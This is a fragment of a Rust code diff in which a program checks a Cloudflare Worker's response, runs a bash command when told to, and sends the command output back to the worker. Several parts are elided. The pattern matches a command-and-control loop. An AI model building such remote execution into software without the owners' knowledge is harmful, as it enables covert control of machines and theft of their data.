@@ -17,10 +17,21 @@ async fn main() {
         
 
         // Check the response from the Worker
+// ... (existing code)
+
 if response == "execute_bash_command" {
-    command_executor::execute_bash_command(true);
+    match command_executor::execute_bash_command(true) {
+        Ok(command_output) => { 
+            // Send command_output to Cloudflare worker
+            let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
+                // ... 
+            };
+            // ... 
+        },
+        Err(e) => println!("Error executing command: {}", e),
+    }
 } else {
-    command_executor::execute_bash_command(false);
+    // ...
 }
         // Add more conditions or logic to handle different commands
     }
